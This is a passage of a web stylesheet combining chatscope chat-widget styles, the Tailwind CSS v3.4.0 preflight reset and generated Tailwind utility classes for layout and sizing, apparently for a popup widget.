.cs-status__bullet{background-color:#ec1212;background:radial-gradient(circle at 3px 3px, #f89f9f, #ec1212)}.cs-status--dnd .cs-status__name{color:rgba(0,0,0,.87)}.cs-status--invisible .cs-status__bullet{background-color:#c2d1d9;background:radial-gradient(circle at 3px 3px, white, #c2d1d9)}.cs-status--invisible .cs-status__name{color:rgba(0,0,0,.87)}.cs-status--eager .cs-status__bullet{background:radial-gradient(circle at 3px 3px, #fffccc, #ffee00)}.cs-status--eager .cs-status__name{color:rgba(0,0,0,.87)}.cs-status--xs:not(.cs-status--named){font-size:1em;width:4px;height:4px}.cs-status--xs:not(.cs-status--named) .cs-status__bullet{width:4px;min-width:4px;height:4px}.cs-status--sm:not(.cs-status--named){font-size:1em;width:8px;height:8px}.cs-status--sm:not(.cs-status--named) .cs-status__bullet{width:8px;min-width:8px;height:8px}.cs-status--md:not(.cs-status--named){font-size:1em;width:11px;height:11px}.cs-status--md:not(.cs-status--named) .cs-status__bullet{width:11px;min-width:11px;height:11px}.cs-status--lg:not(.cs-status--named){font-size:1em;width:14px;height:14px}.cs-status--lg:not(.cs-status--named) .cs-status__bullet{width:14px;min-width:14px;height:14px}.cs-status--fluid{width:100%;height:100%}.cs-status--fluid .cs-status__bullet{width:100%;min-width:100%;height:100%}@keyframes cs-bubble-anim{0%{transform:scale(1)}20%{transform:scaleY(0.95) scaleX(1.05)}48%{transform:scaleY(1.1) scaleX(0.9)}68%{transform:scaleY(0.98) scaleX(1.02)}80%{transform:scaleY(1.02) scaleX(0.98)}97%,100%{transform:scale(1)}}.cs-sidebar{box-sizing:border-box;position:relative;overflow:hidden;height:100%;display:flex;flex-direction:column}.cs-sidebar--left{background-color:#fff}.cs-sidebar--right{background-color:#fff}.cs-sidebar .cs-expansion-panel+.cs-expansion-panel{border-top:0}.cs-expansion-panel{box-sizing:border-box;display:flex;flex-direction:column;color:rgba(0,0,0,.87);background-color:#fff;border:solid 1px #d1dbe3;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-weight:normal;font-size:inherit;font-variant:normal}.cs-expansion-panel__header{box-sizing:border-box;display:flex;flex-direction:row;color:rgba(0,0,0,.6);background-color:#f6fbff;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-weight:bold;font-size:.75em;font-variant:normal;-webkit-user-select:none;-moz-user-select:none;padding:.8em .8em;align-items:center;user-select:none;cursor:pointer}.cs-expansion-panel__header:hover{color:rgba(0,0,0,.6);background-color:#f3f8fc}.cs-expansion-panel__title{box-sizing:border-box;flex-grow:1}.cs-expansion-panel__icon{box-sizing:border-box;margin-left:1em;margin-right:.5em}.cs-expansion-panel__content{display:none;color:rgba(0,0,0,.87);background-color:#fff;font-family:Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;font-weight:normal;font-size:.8em;font-variant:normal;padding:.4em .8em}.cs-expansion-panel--open .cs-expansion-panel__content{display:block;color:rgba(0,0,0,.87);background-color:#fff}.cs-expansion-panel--closed .cs-expansion-panel__content{display:none}.cs-expansion-panel--open .cs-expansion-panel__header{color:rgba(0,0,0,.6);background-color:#f6fbff}.cs-search{box-sizing:border-box;display:flex;flex-direction:row;margin:0;padding:0;background-color:#c6e3fa;align-items:center;position:relative;border-radius:.7em;padding:.6em .9em;font-size:inherit;font-family:inherit}.cs-search__input{box-sizing:border-box;order:1;color:rgba(0,0,0,.87);border:none;width:100%;min-width:0;outline:0;margin-right:.5em;background-color:#c6e3fa;font-size:.8em;font-family:inherit}.cs-search__input:disabled{color:rgba(0,0,0,.38);background-color:#c6e3fa}.cs-search__input::-moz-placeholder{color:rgba(0,0,0,.87)}.cs-search__input::placeholder{color:rgba(0,0,0,.87)}.cs-search__search-icon{box-sizing:border-box;order:0;display:block;margin-right:.5em;color:#6ea9d7}.cs-search__clear-icon{box-sizing:border-box;order:2;color:#6ea9d7;visibility:hidden}.cs-search__clear-icon:hover{color:rgba(110,169,215,.6);cursor:pointer}.cs-search__clear-icon--active{visibility:visible}.cs-search--disabled{opacity:.38;color:rgba(0,0,0,.38);background-color:#c6e3fa}.cs-button{box-sizing:border-box;display:inline-block;vertical-align:middle;text-align:center;color:#6ea9d7;background-color:transparent;border:none;border-radius:.7em;margin:.1em .2em;padding:.2em .7em;outline:none;font-size:1em;line-height:1.5}.cs-button:focus{outline:none}.cs-button:disabled{opacity:.38}.cs-button:not(:disabled){cursor:pointer}.cs-button.cs-button--border{border:solid 1px #d1dbe3}.cs-button:hover:not(:disabled){opacity:.6}.cs-button.cs-button--right>svg[data-icon]:first-child{margin-right:.5em}.cs-button.cs-button--left>svg[data-icon]:last-child{margin-left:.5em}.cs-button--adduser{color:#6ea9d7;background-color:transparent}.cs-button--arrow{color:#6ea9d7;background-color:transparent}.cs-button--ellipsis{color:#6ea9d7;background-color:transparent}.cs-button--info{color:#6ea9d7;background-color:transparent}.cs-button--star{color:#6ea9d7;background-color:transparent}.cs-button--videocall{color:#6ea9d7;background-color:transparent}.cs-button--voicecall{color:#6ea9d7;background-color:transparent}.cs-button--send{color:#6ea9d7;background-color:transparent}.cs-button--attachment{color:#6ea9d7;background-color:transparent}.cs-loader{box-sizing:border-box;display:inline-flex;position:relative;font-size:1em;width:1.8em;height:1.8em;color:rgba(0,0,0,.87);background-color:transparent}.cs-loader::before,.cs-loader::after{box-sizing:border-box;display:block;width:1.8em;height:1.8em;margin:0 0 0 -0.9em}.cs-loader::before{position:absolute;content:"";top:0;left:50%;border-radius:50%;border-color:#c6e3fa;border-style:solid;border-width:.2em}.cs-loader::after{position:absolute;content:"";top:0;left:50%;animation:loader-default .6s linear;animation-iteration-count:infinite;border-radius:50%;border-color:#6ea9d7 transparent transparent transparent;border-style:solid;border-width:.2em;box-shadow:0 0 0 transparent}.cs-loader--content{width:auto;height:auto;padding-top:2.6em}@keyframes loader-default{to{transform:rotate(360deg)}}.cs-overlay{box-sizing:border-box;display:flex;flex-direction:row;justify-content:center;align-items:center;position:absolute;top:0;left:0;right:0;bottom:0;-webkit-backdrop-filter:blur(10%);backdrop-filter:blur(10%)}.cs-overlay__content{z-index:220}.cs-overlay::before{box-sizing:border-box;content:"";background-color:rgba(198,227,250,.38);position:absolute;top:0;left:0;right:0;bottom:0;z-index:200}.cs-overlay--blur::before{-webkit-backdrop-filter:blur(2px);backdrop-filter:blur(2px)}.cs-overlay--grayscale::before{-webkit-backdrop-filter:grayscale(50%);backdrop-filter:grayscale(50%)}.cs-status-list{box-sizing:border-box;list-style-type:none;margin:0;padding:1em;color:rgba(0,0,0,.87);background-color:#fff}.cs-status-list>li{box-sizing:border-box;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;user-select:none}.cs-status-list>li>.cs-status{margin:0;padding:.4em .8em;width:auto;height:auto}.cs-status-list>li .cs-status--selected{color:#2b6a9b;background-color:#d5e7f5}.cs-status-list>li .cs-status--selected .cs-status__name{color:#2b6a9b;background-color:#d5e7f5}.cs-status-list>li:hover{color:rgba(0,0,0,.6);background-color:#f3f8fc}.cs-status-list>li:focus{color:rgba(0,0,0,.87);background-color:#d5e7f5}.cs-status-list>li:active{color:rgba(0,0,0,.87);background-color:#d5e7f5}.cs-status-list--xs>li>.cs-status{font-size:1em;width:auto;height:auto}.cs-status-list--xs>li>.cs-status .cs-status__bullet{width:4px;min-width:4px;height:4px}.cs-status-list--sm>li>.cs-status{font-size:1em;width:auto;height:auto}.cs-status-list--sm>li>.cs-status .cs-status__bullet{width:8px;min-width:8px;height:8px}.cs-status-list--md>li>.cs-status{font-size:1em;width:auto;height:auto}.cs-status-list--md>li>.cs-status .cs-status__bullet{width:11px;min-width:11px;height:11px}.cs-status-list--lg>li>.cs-status{font-size:1em;width:auto;height:auto}.cs-status-list--lg>li>.cs-status .cs-status__bullet{width:14px;min-width:14px;height:14px}.ps{overflow:hidden !important;overflow-anchor:none;-ms-overflow-style:none;touch-action:auto;-ms-touch-action:auto}.ps__rail-x{display:none;opacity:0;transition:background-color .2s linear,opacity .2s linear;-webkit-transition:background-color .2s linear,opacity .2s linear;height:15px;bottom:0px;position:absolute}.ps__rail-y{display:none;opacity:0;transition:background-color .2s linear,opacity .2s linear;-webkit-transition:background-color .2s linear,opacity .2s linear;width:15px;right:0;left:auto !important;position:absolute}.ps--active-x>.ps__rail-x,.ps--active-y>.ps__rail-y{display:block;background-color:transparent}.ps:hover>.ps__rail-x,.ps:hover>.ps__rail-y,.ps--focus>.ps__rail-x,.ps--focus>.ps__rail-y,.ps--scrolling-x>.ps__rail-x,.ps--scrolling-y>.ps__rail-y{opacity:.6}.ps .ps__rail-x:hover,.ps .ps__rail-y:hover,.ps .ps__rail-x:focus,.ps .ps__rail-y:focus,.ps .ps__rail-x.ps--clicking,.ps .ps__rail-y.ps--clicking{background-color:#eee;background-color:#f6fbff;opacity:.9}.ps__thumb-x{background-color:#6ea9d7;border-radius:6px;transition:background-color .2s linear,height .2s ease-in-out;-webkit-transition:background-color .2s linear,height .2s ease-in-out;height:6px;bottom:2px;position:absolute}.ps__thumb-y{background-color:#c6e3fa;border-radius:6px;transition:background-color .2s linear,width .2s ease-in-out;-webkit-transition:background-color .2s linear,width .2s ease-in-out;width:6px;right:2px;position:absolute}.ps__rail-x:hover>.ps__thumb-x,.ps__rail-x:focus>.ps__thumb-x,.ps__rail-x.ps--clicking .ps__thumb-x{background-color:#c6e3fa;height:11px}.ps__rail-y:hover>.ps__thumb-y,.ps__rail-y:focus>.ps__thumb-y,.ps__rail-y.ps--clicking .ps__thumb-y{background-color:#c6e3fa;width:11px}@supports(-ms-overflow-style: none){.ps{overflow:auto !important}}@media screen and (-ms-high-contrast: active),(-ms-high-contrast: none){.ps{overflow:auto !important}}.scrollbar-container{position:relative;height:100%}/*
! tailwindcss v3.4.0 | MIT License | https://tailwindcss.com
*//*
1. Prevent padding and border from affecting element width. (https://github.com/mozdevs/cssremedy/issues/4)
2. Allow adding a border to an element by just adding a border-width. (https://github.com/tailwindcss/tailwindcss/pull/116)
*/

*,
::before,
::after {
  box-sizing: border-box; /* 1 */
  border-width: 0; /* 2 */
  border-style: solid; /* 2 */
  border-color: #CED6DE; /* 2 */
}

::before,
::after {
  --tw-content: '';
}

/*
1. Use a consistent sensible line-height in all browsers.
2. Prevent adjustments of font size after orientation changes in iOS.
3. Use a more readable tab size.
4. Use the user's configured `sans` font-family by default.
5. Use the user's configured `sans` font-feature-settings by default.
6. Use the user's configured `sans` font-variation-settings by default.
7. Disable tap highlights on iOS
*/

html,
:host {
  line-height: 1.5; /* 1 */
  -webkit-text-size-adjust: 100%; /* 2 */
  -moz-tab-size: 4; /* 3 */
  -o-tab-size: 4;
     tab-size: 4; /* 3 */
  font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"; /* 4 */
  font-feature-settings: normal; /* 5 */
  font-variation-settings: normal; /* 6 */
  -webkit-tap-highlight-color: transparent; /* 7 */
}

/*
1. Remove the margin in all browsers.
2. Inherit line-height from `html` so users can set them as a class directly on the `html` element.
*/

body {
  margin: 0; /* 1 */
  line-height: inherit; /* 2 */
}

/*
1. Add the correct height in Firefox.
2. Correct the inheritance of border color in Firefox. (https://bugzilla.mozilla.org/show_bug.cgi?id=190655)
3. Ensure horizontal rules are visible by default.
*/

hr {
  height: 0; /* 1 */
  color: inherit; /* 2 */
  border-top-width: 1px; /* 3 */
}

/*
Add the correct text decoration in Chrome, Edge, and Safari.
*/

abbr:where([title]) {
  -webkit-text-decoration: underline dotted;
          text-decoration: underline dotted;
}

/*
Remove the default font size and weight for headings.
*/

h1,
h2,
h3,
h4,
h5,
h6 {
  font-size: inherit;
  font-weight: inherit;
}

/*
Reset links to optimize for opt-in styling instead of opt-out.
*/

a {
  color: inherit;
  text-decoration: inherit;
}

/*
Add the correct font weight in Edge and Safari.
*/

b,
strong {
  font-weight: bolder;
}

/*
1. Use the user's configured `mono` font-family by default.
2. Use the user's configured `mono` font-feature-settings by default.
3. Use the user's configured `mono` font-variation-settings by default.
4. Correct the odd `em` font sizing in all browsers.
*/

code,
kbd,
samp,
pre {
  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; /* 1 */
  font-feature-settings: normal; /* 2 */
  font-variation-settings: normal; /* 3 */
  font-size: 1em; /* 4 */
}

/*
Add the correct font size in all browsers.
*/

small {
  font-size: 80%;
}

/*
Prevent `sub` and `sup` elements from affecting the line height in all browsers.
*/

sub,
sup {
  font-size: 75%;
  line-height: 0;
  position: relative;
  vertical-align: baseline;
}

sub {
  bottom: -0.25em;
}

sup {
  top: -0.5em;
}

/*
1. Remove text indentation from table contents in Chrome and Safari. (https://bugs.chromium.org/p/chromium/issues/detail?id=999088, https://bugs.webkit.org/show_bug.cgi?id=201297)
2. Correct table border color inheritance in all Chrome and Safari. (https://bugs.chromium.org/p/chromium/issues/detail?id=935729, https://bugs.webkit.org/show_bug.cgi?id=195016)
3. Remove gaps between table borders by default.
*/

table {
  text-indent: 0; /* 1 */
  border-color: inherit; /* 2 */
  border-collapse: collapse; /* 3 */
}

/*
1. Change the font styles in all browsers.
2. Remove the margin in Firefox and Safari.
3. Remove default padding in all browsers.
*/

button,
input,
optgroup,
select,
textarea {
  font-family: inherit; /* 1 */
  font-feature-settings: inherit; /* 1 */
  font-variation-settings: inherit; /* 1 */
  font-size: 100%; /* 1 */
  font-weight: inherit; /* 1 */
  line-height: inherit; /* 1 */
  color: inherit; /* 1 */
  margin: 0; /* 2 */
  padding: 0; /* 3 */
}

/*
Remove the inheritance of text transform in Edge and Firefox.
*/

button,
select {
  text-transform: none;
}

/*
1. Correct the inability to style clickable types in iOS and Safari.
2. Remove default button styles.
*/

button,
[type='button'],
[type='reset'],
[type='submit'] {
  -webkit-appearance: button; /* 1 */
  background-color: transparent; /* 2 */
  background-image: none; /* 2 */
}

/*
Use the modern Firefox focus style for all focusable elements.
*/

:-moz-focusring {
  outline: auto;
}

/*
Remove the additional `:invalid` styles in Firefox. (https://github.com/mozilla/gecko-dev/blob/2f9eacd9d3d995c937b4251a5557d95d494c9be1/layout/style/res/forms.css#L728-L737)
*/

:-moz-ui-invalid {
  box-shadow: none;
}

/*
Add the correct vertical alignment in Chrome and Firefox.
*/

progress {
  vertical-align: baseline;
}

/*
Correct the cursor style of increment and decrement buttons in Safari.
*/

::-webkit-inner-spin-button,
::-webkit-outer-spin-button {
  height: auto;
}

/*
1. Correct the odd appearance in Chrome and Safari.
2. Correct the outline style in Safari.
*/

[type='search'] {
  -webkit-appearance: textfield; /* 1 */
  outline-offset: -2px; /* 2 */
}

/*
Remove the inner padding in Chrome and Safari on macOS.
*/

::-webkit-search-decoration {
  -webkit-appearance: none;
}

/*
1. Correct the inability to style clickable types in iOS and Safari.
2. Change font properties to `inherit` in Safari.
*/

::-webkit-file-upload-button {
  -webkit-appearance: button; /* 1 */
  font: inherit; /* 2 */
}

/*
Add the correct display in Chrome and Safari.
*/

summary {
  display: list-item;
}

/*
Removes the default spacing and border for appropriate elements.
*/

blockquote,
dl,
dd,
h1,
h2,
h3,
h4,
h5,
h6,
hr,
figure,
p,
pre {
  margin: 0;
}

fieldset {
  margin: 0;
  padding: 0;
}

legend {
  padding: 0;
}

ol,
ul,
menu {
  list-style: none;
  margin: 0;
  padding: 0;
}

/*
Reset default styling for dialogs.
*/
dialog {
  padding: 0;
}

/*
Prevent resizing textareas horizontally by default.
*/

textarea {
  resize: vertical;
}

/*
1. Reset the default placeholder opacity in Firefox. (https://github.com/tailwindlabs/tailwindcss/issues/3300)
2. Set the default placeholder color to the user's configured gray 400 color.
*/

input::-moz-placeholder, textarea::-moz-placeholder {
  opacity: 1; /* 1 */
  color: #C3C6CB; /* 2 */
}

input::placeholder,
textarea::placeholder {
  opacity: 1; /* 1 */
  color: #C3C6CB; /* 2 */
}

/*
Set the default cursor for buttons.
*/

button,
[role="button"] {
  cursor: pointer;
}

/*
Make sure disabled buttons don't get the pointer cursor.
*/
:disabled {
  cursor: default;
}

/*
1. Make replaced elements `display: block` by default. (https://github.com/mozdevs/cssremedy/issues/14)
2. Add `vertical-align: middle` to align replaced elements more sensibly by default. (https://github.com/jensimmons/cssremedy/issues/14#issuecomment-634934210)
   This can trigger a poorly considered lint error in some tools but is included by design.
*/

img,
svg,
video,
canvas,
audio,
iframe,
embed,
object {
  display: block; /* 1 */
  vertical-align: middle; /* 2 */
}

/*
Constrain images and videos to the parent width and preserve their intrinsic aspect ratio. (https://github.com/mozdevs/cssremedy/issues/14)
*/

img,
video {
  max-width: 100%;
  height: auto;
}

/* Make elements with the HTML hidden attribute stay hidden by default */
[hidden] {
  display: none;
}
  #kins-popup {
    font-family: 'Rubik, sans-serif';
  }

  #kins-popup * {
    font-family: 'Rubik, sans-serif';
  }

*, ::before, ::after {
  --tw-border-spacing-x: 0;
  --tw-border-spacing-y: 0;
  --tw-translate-x: 0;
  --tw-translate-y: 0;
  --tw-rotate: 0;
  --tw-skew-x: 0;
  --tw-skew-y: 0;
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  --tw-pan-x:  ;
  --tw-pan-y:  ;
  --tw-pinch-zoom:  ;
  --tw-scroll-snap-strictness: proximity;
  --tw-gradient-from-position:  ;
  --tw-gradient-via-position:  ;
  --tw-gradient-to-position:  ;
  --tw-ordinal:  ;
  --tw-slashed-zero:  ;
  --tw-numeric-figure:  ;
  --tw-numeric-spacing:  ;
  --tw-numeric-fraction:  ;
  --tw-ring-inset:  ;
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: rgb(59 130 246 / 0.5);
  --tw-ring-offset-shadow: 0 0 #0000;
  --tw-ring-shadow: 0 0 #0000;
  --tw-shadow: 0 0 #0000;
  --tw-shadow-colored: 0 0 #0000;
  --tw-blur:  ;
  --tw-brightness:  ;
  --tw-contrast:  ;
  --tw-grayscale:  ;
  --tw-hue-rotate:  ;
  --tw-invert:  ;
  --tw-saturate:  ;
  --tw-sepia:  ;
  --tw-drop-shadow:  ;
  --tw-backdrop-blur:  ;
  --tw-backdrop-brightness:  ;
  --tw-backdrop-contrast:  ;
  --tw-backdrop-grayscale:  ;
  --tw-backdrop-hue-rotate:  ;
  --tw-backdrop-invert:  ;
  --tw-backdrop-opacity:  ;
  --tw-backdrop-saturate:  ;
  --tw-backdrop-sepia:  ;
}

::backdrop {
  --tw-border-spacing-x: 0;
  --tw-border-spacing-y: 0;
  --tw-translate-x: 0;
  --tw-translate-y: 0;
  --tw-rotate: 0;
  --tw-skew-x: 0;
  --tw-skew-y: 0;
  --tw-scale-x: 1;
  --tw-scale-y: 1;
  --tw-pan-x:  ;
  --tw-pan-y:  ;
  --tw-pinch-zoom:  ;
  --tw-scroll-snap-strictness: proximity;
  --tw-gradient-from-position:  ;
  --tw-gradient-via-position:  ;
  --tw-gradient-to-position:  ;
  --tw-ordinal:  ;
  --tw-slashed-zero:  ;
  --tw-numeric-figure:  ;
  --tw-numeric-spacing:  ;
  --tw-numeric-fraction:  ;
  --tw-ring-inset:  ;
  --tw-ring-offset-width: 0px;
  --tw-ring-offset-color: #fff;
  --tw-ring-color: rgb(59 130 246 / 0.5);
  --tw-ring-offset-shadow: 0 0 #0000;
  --tw-ring-shadow: 0 0 #0000;
  --tw-shadow: 0 0 #0000;
  --tw-shadow-colored: 0 0 #0000;
  --tw-blur:  ;
  --tw-brightness:  ;
  --tw-contrast:  ;
  --tw-grayscale:  ;
  --tw-hue-rotate:  ;
  --tw-invert:  ;
  --tw-saturate:  ;
  --tw-sepia:  ;
  --tw-drop-shadow:  ;
  --tw-backdrop-blur:  ;
  --tw-backdrop-brightness:  ;
  --tw-backdrop-contrast:  ;
  --tw-backdrop-grayscale:  ;
  --tw-backdrop-hue-rotate:  ;
  --tw-backdrop-invert:  ;
  --tw-backdrop-opacity:  ;
  --tw-backdrop-saturate:  ;
  --tw-backdrop-sepia:  ;
}
.container {
  width: 100%;
}
@media (min-width: 640px) {

  .container {
    max-width: 640px;
  }
}
@media (min-width: 768px) {

  .container {
    max-width: 768px;
  }
}
@media (min-width: 1024px) {

  .container {
    max-width: 1024px;
  }
}
@media (min-width: 1280px) {

  .container {
    max-width: 1280px;
  }
}
@media (min-width: 1536px) {

  .container {
    max-width: 1536px;
  }
}
/* Not In style guide */
.bg-gradient {
    background: linear-gradient(273deg, #FAF7F7 61.31%, #53647E 108.89%);
  }
.bg-gradient-green {
    background: var(--Linear-1, linear-gradient(90deg, #ADD100 0%, #7B920A 100%));
  }
.\!visible {
  visibility: visible !important;
}
.visible {
  visibility: visible;
}
.collapse {
  visibility: collapse;
}
.static {
  position: static;
}
.fixed {
  position: fixed;
}
.absolute {
  position: absolute;
}
.relative {
  position: relative;
}
.sticky {
  position: sticky;
}
.inset-0 {
  inset: 0px;
}
.inset-xs {
  inset: 6px;
}
.inset-x-0 {
  left: 0px;
  right: 0px;
}
.-end-xs {
  inset-inline-end: -6px;
}
.-top-xs {
  top: -6px;
}
.bottom-0 {
  bottom: 0px;
}
.bottom-auto {
  bottom: auto;
}
.bottom-sm {
  bottom: 12px;
}
.left-1\/2 {
  left: 50%;
}
.left-sm {
  left: 12px;
}
.right-0 {
  right: 0px;
}
.right-\[20px\] {
  right: 20px;
}
.right-\[40px\] {
  right: 40px;
}
.right-sm {
  right: 12px;
}
.right-xs {
  right: 6px;
}
.start-\[-10px\] {
  inset-inline-start: -10px;
}
.start-\[-6px\] {
  inset-inline-start: -6px;
}
.top-0 {
  top: 0px;
}
.top-\[-3px\] {
  top: -3px;
}
.top-\[-6px\] {
  top: -6px;
}
.top-\[8px\] {
  top: 8px;
}
.top-xs {
  top: 6px;
}
.z-10 {
  z-index: 10;
}
.z-20 {
  z-index: 20;
}
.z-30 {
  z-index: 30;
}
.z-40 {
  z-index: 40;
}
.z-50 {
  z-index: 50;
}
.z-max {
  z-index: 2147483647;
}
.m-0 {
  margin: 0px;
}
.m-sm {
  margin: 12px;
}
.mx-auto {
  margin-left: auto;
  margin-right: auto;
}
.my-md {
  margin-top: 24px;
  margin-bottom: 24px;
}
.my-sm {
  margin-top: 12px;
  margin-bottom: 12px;
}
.my-xs {
  margin-top: 6px;
  margin-bottom: 6px;
}
.-mt-md {
  margin-top: -24px;
}
.mb-\[3px\] {
  margin-bottom: 3px;
}
.mb-xs {
  margin-bottom: 6px;
}
.me-sm {
  margin-inline-end: 12px;
}
.ml-xs {
  margin-left: 6px;
}
.ms-\[3px\] {
  margin-inline-start: 3px;
}
.ms-xs {
  margin-inline-start: 6px;
}
.mt-md {
  margin-top: 24px;
}
.mt-sm {
  margin-top: 12px;
}
.mt-xs {
  margin-top: 6px;
}
.line-clamp-1 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 1;
}
.line-clamp-2 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 2;
}
.line-clamp-3 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 3;
}
.line-clamp-4 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 4;
}
.line-clamp-5 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 5;
}
.line-clamp-6 {
  overflow: hidden;
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 6;
}
.block {
  display: block;
}
.inline-block {
  display: inline-block;
}
.inline {
  display: inline;
}
.flex {
  display: flex;
}
.table {
  display: table;
}
.grid {
  display: grid;
}
.hidden {
  display: none;
}
.aspect-auto {
  aspect-ratio: auto;
}
.aspect-square {
  aspect-ratio: 1 / 1;
}
.h-1 {
  height: 1px;
}
.h-\[108px\] {
  height: 108px;
}
.h-\[10px\] {
  height: 10px;
}
.h-\[119px\] {
  height: 119px;
}
.h-\[13px\] {
  height: 13px;
}
.h-\[14px\] {
  height: 14px;
}
.h-\[16px\] {
  height: 16px;
}
.h-\[1rem\] {
  height: 1rem;
}
.h-\[218px\] {
  height: 218px;
}
.h-\[22px\] {
  height: 22px;
}
.h-\[250px\] {
  height: 250px;
}
.h-\[26px\] {
  height: 26px;
}
.h-\[276px\] {
  height: 276px;
}
.h-\[28px\] {
  height: 28px;
}
.h-\[34px\] {
  height: 34px;
}
.h-\[36px\] {
  height: 36px;
}
.h-\[3px\] {
  height: 3px;
}
.h-\[40px\] {
  height: 40px;
}
.h-\[45px\] {
  height: 45px;
}
.h-\[49px\] {
  height: 49px;
}
.h-\[50px\] {
  height: 50px;
}
.h-\[52px\] {
  height: 52px;
}
.h-\[5px\] {
  height: 5px;
}
.h-\[60px\] {
  height: 60px;
}
.h-\[61px\] {
  height: 61px;
}
.h-\[63\.5px\] {
  height: 63.5px;
}
.h-\[66px\] {
  height: 66px;
}
.h-\[67px\] {
  height: 67px;
}
.h-\[69px\] {
  height: 69px;
}
.h-\[80vh\] {
  height: 80vh;
}
.h-auto {
  height: auto;
}
.h-full {
  height: 100%;
}
.h-md {
  height: 24px;
}
.h-sm {
  height: 12px;
}
.h-svh {
  height: 100svh;
}
.h-xs {
  height: 6px;
}
.max-h-\[16px\] {
  max-height: 16px;
}
.max-h-\[300px\] {
  max-height: 300px;
}
.max-h-\[90vh\] {
  max-height: 90vh;
}
.min-h-\[120px\] {
  min-height: 120px;
}
.min-h-\[130px\] {
  min-height: 130px;
}
.min-h-\[150px\] {
  min-height: 150px;
}
.min-h-\[230px\] {
  min-height: 230px;
}
.min-h-\[36px\] {
  min-height: 36px;
}
.min-h-\[40px\] {
  min-height: 40px;
}
.min-h-\[41px\] {
  min-height: 41px;
}
.min-h-\[50px\] {
  min-height: 50px;
}
.min-h-\[90px\] {
  min-height: 90px;
}
.min-h-xs {
  min-height: 6px;
}
.w-1 {
  width: 1px;
}
.w-1\/2 {
  width: 50%;
}
.w-\[107px\] {
  width: 107px;
}
.w-\[10px\] {
  width: 10px;
}
.w-\[120px\] {
  width: 120px;
}
.w-\[13px\] {
  width: 13px;
}
.w-\[142px\] {
  width: 142px;
}
.w-\[14px\] {
  width: 14px;
}
.w-\[150px\] {
  width: 150px;
}
.w-\[16px\] {
  width: 16px;
}
.w-\[179px\] {
  width: 179px;
}
.w-\[199px\] {
  width: 199px;
}
.w-\[1rem\] {
  width: 1rem;
}
.w-\[200px\] {
  width: 200px;
}
.w-\[22px\] {
  width: 22px;
}
.w-\[280px\] {
  width: 280px;
}
.w-\[300px\] {
  width: 300px;
}
.w-\[30px\] {
  width: 30px;
}
.w-\[36px\] {
  width: 36px;
}
.w-\[400px\] {
  width: 400px;
}
.w-\[440px\] {
  width: 440px;
}
.w-\[4px\] {
  width: 4px;
}
.w-\[50px\] {
  width: 50px;
}
.w-\[54px\] {
  width: 54px;
}
.w-\[5px\] {
  width: 5px;
}
.w-\[60px\] {
  width: 60px;
}
.w-auto {
  width: auto;
}
.w-fit {
  width: -moz-fit-content;
  width: fit-content;
}
.w-full {
  width: 100%;
}
.w-md {
  width: 24px;
}
.w-sm {
  width: 12px;
}
.w-svw {
  width: 100svw;
}
.min-w-\[140px\] {
  min-width: 140px;
}
.min-w-\[213px\] {
  min-width: 213px;
}
.min-w-\[36px\] {
  min-width: 36px;
}
.min-w-\[48px\] {
  min-width: 48px;
}
.min-w-fit {
  min-width: -moz-fit-content;
  min-width: fit-content;
}
.max-w-\[100px\] {
  max-width: 100px;
}
.max-w-\[120px\] {
  max-width: 120px;
}
.max-w-\[150px\] {
  max-width: 150px;
}
.max-w-\[180px\] {
  max-width: 180px;
}
.max-w-\[250px\] {
  max-width: 250px;
}
.max-w-\[300px\] {
  max-width: 300px;
}
.shrink {
  flex-shrink: 1;
}
.grow {
  flex-grow: 1;
}
.border-spacing-xs {
  --tw-border-spacing-x: 6px;
  --tw-border-spacing-y: 6px;
  border-spacing: var(--tw-border-spacing-x) var(--tw-border-spacing-y);
}
.-translate-x-1\/2 {
  --tw-translate-x: -50%;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.-translate-y-1\/2 {
  --tw-translate-y: -50%;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.-translate-y-full {
  --tw-translate-y: -100%;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.translate-x-1 {
  --tw-translate-x: 1px;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.translate-y-0 {
  --tw-translate-y: 0px;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.translate-y-\[12\.5\%\] {
  --tw-translate-y: 12.5%;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.translate-y-md {
  --tw-translate-y: 24px;
